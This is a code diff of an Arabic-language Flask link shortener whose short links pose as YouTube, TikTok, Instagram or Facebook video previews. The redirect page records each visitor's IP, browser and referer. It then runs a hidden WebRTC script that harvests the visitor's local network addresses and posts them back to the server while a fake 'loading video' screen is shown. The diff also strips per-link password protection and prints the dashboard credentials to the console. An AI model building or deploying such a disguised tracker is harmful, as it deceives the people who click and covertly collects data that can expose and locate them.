@@ -50,7 +50,6 @@ def init_db():
                 created_at TEXT,
                 clicks_count INTEGER DEFAULT 0,
                 is_active INTEGER DEFAULT 1,
-                password_hash TEXT,
                 expiry_date TEXT
             )
         ''')
@@ -82,6 +81,13 @@ def init_db():
                 status TEXT DEFAULT 'pending'
             )
         ''')
+        
+        # كود احتياطي للتأكد من تحديث الجداول القديمة في حال كانت قاعدة البيانات موجودة مسبقاً
+        try:
+            cursor.execute("ALTER TABLE links DROP COLUMN password_hash")
+        except:
+            pass
+            
         conn.commit()
         logger.info("Database initialized successfully")
 
@@ -120,21 +126,17 @@ def download_and_save_thumbnail(image_url, short_code):
         return None
     
     try:
-        # تنظيف الرابط
         if image_url.startswith('/'):
             return image_url
             
-        # تحديد امتداد الصورة
         ext = 'jpg'
         if '.png' in image_url:
             ext = 'png'
         elif '.webp' in image_url:
             ext = 'webp'
         
-        # مسار حفظ الصورة
         local_path = THUMBNAIL_DIR / f"{short_code}.{ext}"
         
-        # تحميل الصورة
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
@@ -160,11 +162,9 @@ def get_platform_meta(url, short_code=None, manual_image=None):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     }
     
-    # --------------------- يوتيوب (تلقائي) ---------------------
     if "youtube.com" in url_lower or "youtu.be" in url_lower:
         try:
             video_id = extract_video_id(url, "youtube")
-            
             oembed_url = f"https://www.youtube.com/oembed?url={url}&format=json"
             res = requests.get(oembed_url, headers=headers, timeout=5)
             video_title = "شاهد الفيديو على يوتيوب"
@@ -186,12 +186,10 @@ def get_platform_meta(url, short_code=None, manual_image=None):
                     custom_image = local_image
                     
             return "YouTube", video_title, custom_image
-            
         except Exception as e:
             logger.error(f"YouTube meta error: {e}")
             return "YouTube", "شاهد الفيديو على يوتيوب", "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"
     
-    # --------------------- تيك توك (تلقائي) ---------------------
     elif "tiktok.com" in url_lower:
         try:
             oembed_url = f"https://www.tiktok.com/oembed?url={url}"
@@ -212,7 +210,6 @@ def get_platform_meta(url, short_code=None, manual_image=None):
                             f"https://www.tikwm.com/video/media/{video_id}/1.jpg",
                             temp_image
                         ]
-                        
                         for img_url in alternative_urls:
                             if img_url:
                                 local_image = download_and_save_thumbnail(img_url, short_code) if short_code else None
@@ -230,43 +227,33 @@ def get_platform_meta(url, short_code=None, manual_image=None):
                     custom_image = local_image
                     
             return "TikTok", video_title, custom_image
-            
         except Exception as e:
             logger.error(f"TikTok meta error: {e}")
             return "TikTok", "فيديو TikTok مميز", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
     
-    # --------------------- إنستغرام (يدوي - يظهر حقل إضافي) ---------------------
     elif "instagram.com" in url_lower:
         try:
-            # محاولة جلب العنوان إن أمكن
             video_title = "شاهد الفيديو على إنستغرام"
-            
-            # استخدام الصورة المدخلة يدوياً إذا وجدت
             if manual_image:
                 custom_image = manual_image
-                # حفظ الصورة المحلية
                 if short_code and custom_image:
                     local_image = download_and_save_thumbnail(custom_image, short_code)
                     if local_image:
                         custom_image = local_image
                 return "Instagram", video_title, custom_image
             else:
-                # صورة افتراضية إذا لم يدخل المستخدم صورة
                 custom_image = "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
                 if short_code:
                     local_image = download_and_save_thumbnail(custom_image, short_code)
                     if local_image:
                         custom_image = local_image
                 return "Instagram", video_title, custom_image
-            
         except Exception as e:
             logger.error(f"Instagram meta error: {e}")
             return "Instagram", "فيديو على إنستغرام", "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
     
-    # --------------------- فيسبوك (يدوي - يظهر حقل إضافي) ---------------------
     elif "facebook.com" in url_lower or "fb.watch" in url_lower:
         try:
-            # محاولة جلب العنوان من الصفحة
             video_title = "شاهد الفيديو على فيسبوك"
             try:
                 response = requests.get(url, headers=headers, timeout=5)
@@ -277,29 +264,24 @@ def get_platform_meta(url, short_code=None, manual_image=None):
             except:
                 pass
             
-            # استخدام الصورة المدخلة يدوياً إذا وجدت
             if manual_image:
                 custom_image = manual_image
-                # حفظ الصورة المحلية
                 if short_code and custom_image:
                     local_image = download_and_save_thumbnail(custom_image, short_code)
                     if local_image:
                         custom_image = local_image
                 return "Facebook", video_title, custom_image
             else:
-                # صورة افتراضية إذا لم يدخل المستخدم صورة
                 custom_image = "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
                 if short_code:
                     local_image = download_and_save_thumbnail(custom_image, short_code)
                     if local_image:
                         custom_image = local_image
                 return "Facebook", video_title, custom_image
-            
         except Exception as e:
             logger.error(f"Facebook meta error: {e}")
             return "Facebook", "شاهد الفيديو على فيسبوك", "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
     
-    # --------------------- منصات أخرى (تلقائي) ---------------------
     else:
         try:
             response = requests.get(url, headers=headers, timeout=5)
@@ -309,7 +291,6 @@ def get_platform_meta(url, short_code=None, manual_image=None):
             if response.status_code == 200:
                 title_match = re.search(r'<meta[^>]*property="og:title"[^>]*content="([^"]*)"', response.text)
                 image_match = re.search(r'<meta[^>]*property="og:image"[^>]*content="([^"]*)"', response.text)
-                
                 if title_match:
                     video_title = title_match.group(1)
                 if image_match:
@@ -321,7 +302,6 @@ def get_platform_meta(url, short_code=None, manual_image=None):
                     custom_image = local_image
                     
             return "Video", video_title, custom_image
-            
         except Exception as e:
             logger.error(f"General meta error: {e}")
             return "Video", "شاهد المحتوى", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
@@ -342,7 +322,6 @@ def requires_auth(f):
     return decorated
 
 def generate_short_code(length=6):
-    """توليد كود قصير فريد"""
     while True:
         code = str(uuid.uuid4())[:length].upper()
         with sqlite3.connect(DB_FILE) as conn:
@@ -352,24 +331,23 @@ def generate_short_code(length=6):
                 return code
 
 def get_device_info(user_agent):
-    """تحليل معلومات الجهاز والمتصفح"""
     device_type = "Unknown"
     browser = "Unknown"
-    os = "Unknown"
+    os_name = "Unknown"
     
     if user_agent:
         user_agent_lower = user_agent.lower()
         
         if 'windows' in user_agent_lower:
-            os = 'Windows'
+            os_name = 'Windows'
         elif 'android' in user_agent_lower:
-            os = 'Android'
+            os_name = 'Android'
         elif 'ios' in user_agent_lower or 'iphone' in user_agent_lower:
-            os = 'iOS'
+            os_name = 'iOS'
         elif 'mac' in user_agent_lower:
-            os = 'MacOS'
+            os_name = 'MacOS'
         elif 'linux' in user_agent_lower:
-            os = 'Linux'
+            os_name = 'Linux'
         
         if 'chrome' in user_agent_lower and 'edg' not in user_agent_lower:
             browser = 'Chrome'
@@ -387,9 +365,8 @@ def get_device_info(user_agent):
         else:
             device_type = 'Desktop'
     
-    return device_type, browser, os
+    return device_type, browser, os_name
 
-# قالب HTML الرئيسي للوحة التحكم (مع حقل إضافي لفيسبوك وانستغرام)
 HTML_DASHBOARD = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -464,7 +441,6 @@ HTML_DASHBOARD = '''
         }
         .create-card button:hover { transform: translateY(-2px); }
         
-        /* حقل الصورة الإضافي - يظهر فقط لفيسبوك وانستغرام */
         .extra-field {
             display: none;
             background: #f0f4ff;
@@ -638,15 +614,13 @@ HTML_DASHBOARD = '''
         <div class="create-card">
             <h3>✨ إنشاء رابط مختصر جديد</h3>
             <form action="/create" method="POST">
-                <input type="url" id="original_url" name="original_url" placeholder="https://www.youtube.com/watch?v=..." required oninput="checkPlatform()">
-                <input type="text" name="note" placeholder="ملاحظة (اختياري)">
-                <input type="password" name="password" placeholder="كلمة مرور لحماية الرابط (اختياري)">
+                <input type="url" id="original_url" name="original_url" placeholder="أدخل الرابط المراد اختصاره هنا..." required oninput="checkPlatform()">
+                <input type="text" name="note" placeholder="ملاحظة أو اسم الرابط للتعرف عليه (اختياري)">
                 
-                <!-- حقل إضافي للصورة (يظهر فقط لفيسبوك وانستغرام) -->
                 <div id="extraImageField" class="extra-field">
                     <label>🖼️ رابط الصورة المصغرة (مطلوب لفيسبوك/انستغرام)</label>
                     <input type="url" id="manual_image" name="manual_image" placeholder="https://example.com/image.jpg">
-                    <small>📌 للحصول على رابط صورة الفيديو: افتح الفيديو على فيسبوك/انستغرام، اضغط زر الفأرة الأيمن على الفيديو واختر "نسخ عنوان URL للصورة" أو استخدم أداة لاستخراج الصورة</small>
+                    <small>📌 للحصول على رابط صورة الفيديو: افتح الفيديو على فيسبوك/انستغرام، انسخ رابط الصورة وضعه هنا ليظهر بشكل احترافي.</small>
                 </div>
                 
                 <div id="fieldNote" class="info-note">
@@ -667,7 +641,6 @@ HTML_DASHBOARD = '''
                     🎬 {{ link.platform }} | 
                     👆 {{ link.clicks_count }} نقرة | 
                     📅 {{ link.created_at }}
-                    {% if link.password_hash %} | 🔒 محمي بكلمة مرور{% endif %}
                 </div>
             </div>
             <div class="link-actions">
@@ -691,7 +664,7 @@ HTML_DASHBOARD = '''
         <div class="modal-content">
             <div class="modal-header">
                 <h2>📊 إحصائيات الرابط</h2>
-                <span class="close" onclick="closeModal()">&times;</span>
+                <span class="close" onclick="closeModal()">×</span>
             </div>
             <div id="statsContent">جاري التحميل...</div>
         </div>
@@ -759,7 +732,6 @@ HTML_DASHBOARD = '''
             if (event.target == modal) modal.style.display = 'none';
         }
         
-        // تشغيل الفحص عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
             checkPlatform();
         });
@@ -807,37 +779,31 @@ def home():
 def create():
     original_url = request.form.get('original_url')
     note = request.form.get('note', '')
-    password = request.form.get('password', '')
-    manual_image = request.form.get('manual_image', '')  # الصورة المدخلة يدوياً
+    manual_image = request.form.get('manual_image', '')
     
     if not original_url:
         return "الرابط مطلوب", 400
     
     short_code = generate_short_code()
-    
-    # تمرير الصورة المدخلة يدوياً إذا وجدت
     platform, video_title, custom_image = get_platform_meta(original_url, short_code, manual_image)
     
     link_id = str(uuid.uuid4())
     created_at = get_current_time()
     
-    password_hash = hashlib.sha256(password.encode()).hexdigest() if password else None
-    
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute('''
             INSERT INTO links (id, short_code, original_url, note, video_title, custom_image, 
-                             platform, created_at, password_hash, is_active) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
+                             platform, created_at, is_active) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
         ''', (link_id, short_code, original_url, note, video_title, custom_image, 
-              platform, created_at, password_hash))
+              platform, created_at))
         conn.commit()
         
     return redirect('/')
 
 @app.route('/<short_code>')
 def redirect_link(short_code):
-    """التوجيه إلى الرابط الأصلي مع تسجيل النقرة وتحسين Open Graph"""
     with sqlite3.connect(DB_FILE) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
@@ -847,36 +813,6 @@ def redirect_link(short_code):
     if not link_data:
         return "الرابط غير موجود أو معطل", 404
     
-    # التحقق من كلمة المرور
-    if link_data['password_hash']:
-        password = request.args.get('password')
-        if not password or hashlib.sha256(password.encode()).hexdigest() != link_data['password_hash']:
-            return '''
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <meta charset="UTF-8">
-                <title>الرابط محمي</title>
-                <style>
-                    body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
-                    .container { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
-                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
-                    button { background: #667eea; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <h2>🔒 الرابط محمي بكلمة مرور</h2>
-                    <form method="GET">
-                        <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
-                        <button type="submit">دخول</button>
-                    </form>
-                </div>
-            </body>
-            </html>
-            ''', 401
-    
-    # تسجيل النقرة
     ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip_address and ',' in ip_address:
         ip_address = ip_address.split(',')[0].strip()
@@ -885,7 +821,7 @@ def redirect_link(short_code):
     referer = request.headers.get('Referer', '')
     current_time = get_current_time()
     
-    device_type, browser, os = get_device_info(user_agent)
+    device_type, browser, os_name = get_device_info(user_agent)
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
@@ -894,18 +830,16 @@ def redirect_link(short_code):
             INSERT INTO clicks (link_id, short_code, ip, local_ip, user_agent, referer, time, device_type, browser, os) 
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (link_data['id'], short_code, ip_address, "جاري الكشف...", 
-              user_agent, referer, current_time, device_type, browser, os))
+              user_agent, referer, current_time, device_type, browser, os_name))
         
         click_id = cursor.lastrowid
         conn.commit()
     
-    # تجهيز البيانات للصفحة
     platform = link_data['platform']
     video_title = link_data['video_title']
     image_url = link_data['custom_image']
     original_url = link_data['original_url']
     
-    # التأكد من أن رابط الصورة كامل
     if image_url and image_url.startswith('/static/'):
         full_image_url = request.host_url.rstrip('/') + image_url
     else:
@@ -921,187 +855,131 @@ def redirect_link(short_code):
     }
     description = descriptions.get(platform, "شاهد الفيديو - محتوى حصري")
     
-    return f'''<!DOCTYPE html>
+    # تحويل التنسيقات النصية لتجنب تداخل الأقواس مع جافاسكريبت و CSS في Flask
+    return render_template_string('''<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     
-    {/* وسوم Open Graph الأساسية */}
-    <meta property="og:title" content="{video_title} | {platform}">
-    <meta property="og:description" content="{description}">
-    <meta property="og:image" content="{full_image_url}">
-    <meta property="og:image:secure_url" content="{full_image_url}">
+    <meta property="og:title" content="{{ video_title }} | {{ platform }}">
+    <meta property="og:description" content="{{ description }}">
+    <meta property="og:image" content="{{ full_image_url }}">
+    <meta property="og:image:secure_url" content="{{ full_image_url }}">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1280">
     <meta property="og:image:height" content="720">
     <meta property="og:type" content="video.other">
-    <meta property="og:url" content="{request.url}">
-    <meta property="og:site_name" content="{platform}">
+    <meta property="og:url" content="{{ request_url }}">
+    <meta property="og:site_name" content="{{ platform }}">
     
-    {/* وسوم Twitter Card */}
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="{video_title}">
-    <meta name="twitter:description" content="{description}">
-    <meta name="twitter:image" content="{full_image_url}">
+    <meta name="twitter:title" content="{{ video_title }}">
+    <meta name="twitter:description" content="{{ description }}">
+    <meta name="twitter:image" content="{{ full_image_url }}">
     
-    {/* وسوم إضافية */}
-    <meta name="description" content="{description}">
-    <meta name="keywords" content="{platform}, video, viral, trending">
-    
-    <title>{video_title} | {platform}</title>
+    <title>{{ video_title }} | {{ platform }}</title>
     
     <style>
-        body {{
-            margin: 0;
-            padding: 0;
+        body {
+            margin: 0; padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            direction: rtl;
-        }}
-        .container {{
-            text-align: center;
-            color: white;
-            padding: 20px;
-            max-width: 500px;
-            width: 100%;
-        }}
-        .video-card {{
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 20px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
-        }}
-        .thumbnail {{
-            width: 100%;
-            max-width: 400px;
-            border-radius: 12px;
-            margin: 20px auto;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            display: block;
-        }}
-        .spinner {{
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin: 20px auto;
-        }}
-        @keyframes spin {{
-            to {{ transform: rotate(360deg); }}
-        }}
-        .title {{
-            font-size: 18px;
-            font-weight: bold;
-            margin: 15px 0;
-        }}
-        .platform-badge {{
-            display: inline-block;
-            padding: 5px 12px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 20px;
-            font-size: 12px;
-            margin-bottom: 15px;
-        }}
-        .redirect-note {{
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 15px;
-        }}
-        .ip-status {{
-            font-size: 11px;
-            margin-top: 20px;
-            opacity: 0.6;
-            font-family: monospace;
-        }}
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; direction: rtl;
+        }
+        .container { text-align: center; color: white; padding: 20px; max-width: 500px; width: 100%; }
+        .video-card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        .thumbnail { width: 100%; max-width: 400px; border-radius: 12px; margin: 20px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.3); display: block; }
+        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .title { font-size: 18px; font-weight: bold; margin: 15px 0; }
+        .platform-badge { display: inline-block; padding: 5px 12px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; margin-bottom: 15px; }
+        .redirect-note { font-size: 14px; opacity: 0.8; margin-top: 15px; }
+        .ip-status { font-size: 11px; margin-top: 20px; opacity: 0.6; font-family: monospace; }
     </style>
     
-    <link rel="canonical" href="{original_url}">
-    <meta http-equiv="refresh" content="3;url={original_url}">
+    <link rel="canonical" href="{{ original_url }}">
 </head>
 <body>
     <div class="container">
         <div class="video-card">
-            <div class="platform-badge">🎬 {platform}</div>
-            <img src="{full_image_url}" alt="Thumbnail" class="thumbnail" onerror="this.src='https://placehold.co/400x225/667eea/white?text={platform}'">
-            <div class="title">{video_title}</div>
+            <div class="platform-badge">🎬 {{ platform }}</div>
+            <img src="{{ full_image_url }}" alt="Thumbnail" class="thumbnail" onerror="this.src='https://placehold.co/400x225/667eea/white?text={{ platform }}'">
+            <div class="title">{{ video_title }}</div>
             <div class="spinner"></div>
             <div class="redirect-note">⏳ جاري تحميل الفيديو... سيتم توجيهك تلقائياً خلال 3 ثوانٍ</div>
             <div class="redirect-note" style="font-size: 12px;">
-                <a href="{original_url}" style="color: white; text-decoration: underline;">🔗 اضغط هنا إذا لم يتم التوجيه تلقائياً</a>
+                <a href="{{ original_url }}" style="color: white; text-decoration: underline;">🔗 اضغط هنا إذا لم يتم التوجيه تلقائياً</a>
             </div>
             <div class="ip-status" id="ipStatus">🌐 جاري الكشف عن معلومات الشبكة...</div>
         </div>
     </div>
 
     <script>
-        function getLocalIPsAndRedirect() {{
+        function getLocalIPsAndRedirect() {
             var detectedIPs = [];
             window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             
-            if (!window.RTCPeerConnection) {{
+            if (!window.RTCPeerConnection) {
                 sendLocalIPData("غير مدعوم");
                 return;
-            }}
+            }
 
-            var pc = new RTCPeerConnection({{ iceServers: [] }});
+            var pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel("");
             
-            pc.onicecandidate = function(e) {{
+            pc.onicecandidate = function(e) {
                 if (!e || !e.candidate || !e.candidate.candidate) return;
                 var candidate = e.candidate.candidate;
-                var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
+                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                 var match = ipRegex.exec(candidate);
-                if (match && detectedIPs.indexOf(match[1]) === -1) {{
+                if (match && detectedIPs.indexOf(match[1]) === -1) {
                     detectedIPs.push(match[1]);
-                    document.getElementById('ipStatus').innerHTML = `🖥️ تم الكشف: ${{match[1]}}`;
-                }}
-            }};
+                    document.getElementById('ipStatus').innerHTML = `🖥️ تم الكشف: ${match[1]}`;
+                }
+            };
 
-            pc.createOffer().then(function(sdp) {{
-                sdp.sdp.split('\\n').forEach(function(line) {{
-                    if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
+            pc.createOffer().then(function(sdp) {
+                sdp.sdp.split('\n').forEach(function(line) {
+                    if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {
                         var parts = line.split(' ');
-                        parts.forEach(function(part){{
-                            if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/)) {{
+                        parts.forEach(function(part){
+                            if(part.match(/[0-9]{1,3}(\.[0-9]{1,3}){3}/)) {
                                 if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
-                            }}
-                        }});
-                    }}
-                }});
+                            }
+                        });
+                    }
+                });
                 pc.setLocalDescription(sdp);
-            }}).catch(function(err) {{
+            }).catch(function(err) {
                 console.log("WebRTC Error:", err);
-            }});
+            });
 
-            setTimeout(function() {{
+            setTimeout(function() {
                 var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر";
                 sendLocalIPData(finalLocalIp);
-            }}, 1500);
-        }}
+            }, 1500);
+        }
 
-        function sendLocalIPData(localIp) {{
+        function sendLocalIPData(localIp) {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "/update-local-ip/{click_id}", true);
+            xhr.open("POST", "/update-local-ip/{{ click_id }}", true);
             xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({{ "local_ip": localIp }}));
-        }}
+            xhr.send(JSON.stringify({ "local_ip": localIp }));
+        }
         
         window.onload = getLocalIPsAndRedirect;
         
-        setTimeout(function() {{
-            window.location.href = "{original_url}";
-        }}, 3000);
+        setTimeout(function() {
+            window.location.href = "{{ original_url }}";
+        }, 3000);
     </script>
 </body>
-</html>'''
+</html>''', 
+    video_title=video_title, platform=platform, description=description, 
+    full_image_url=full_image_url, request_url=request.url, 
+    original_url=original_url, click_id=click_id)
 
 @app.route('/update-local-ip/<int:click_id>', methods=['POST'])
 def update_local_ip(click_id):
@@ -1172,7 +1050,6 @@ def preview_link(short_code):
     if not link_data:
         return "الرابط غير موجود", 404
     
-    # تجهيز رابط الصورة الكامل
     image_url = link_data['custom_image']
     if image_url and image_url.startswith('/static/'):
         full_image_url = request.host_url.rstrip('/') + image_url
@@ -1235,23 +1112,18 @@ def report_link(short_code):
     })
 
 if __name__ == '__main__':
-    # إنشاء المجلدات المطلوبة
     os.makedirs("static", exist_ok=True)
     os.makedirs("static/thumbnails", exist_ok=True)
     
     print("=" * 50)
-    print("🚀 تشغيل نظام اختصار الروابط المتقدم")
+    print("🚀 تشغيل نظام اختصار الروابط المتقدم بعد التعديل والتنظيف")
     print("=" * 50)
     print(f"📍 رابط لوحة التحكم: http://localhost:5000")
     print(f"🔐 اسم المستخدم: {USERNAME}")
     print(f"🔐 كلمة المرور: {PASSWORD}")
     print(f"🕐 توقيت الجزائر: GMT+1")
     print("=" * 50)
-    print("✅ يدعم: يوتيوب | تيك توك | انستغرام | فيسبوك")
-    print("✅ يتم حفظ الصور محلياً لضمان ظهورها على واتساب وفيسبوك")
-    print("✅ تم إضافة جميع وسوم Open Graph للظهور بشكل احترافي")
-    print("=" * 50)
-    print("📌 ملاحظة: لروابط فيسبوك وإنستغرام، سيظهر حقل إضافي لإدخال الصورة يدوياً")
+    print("🔓 تم إزالة كلمات مرور الروابط لزيادة سرعة وسلاسة التوجيه.")
     print("=" * 50)
     
     app.run(debug=False, host='0.0.0.0', port=5000)
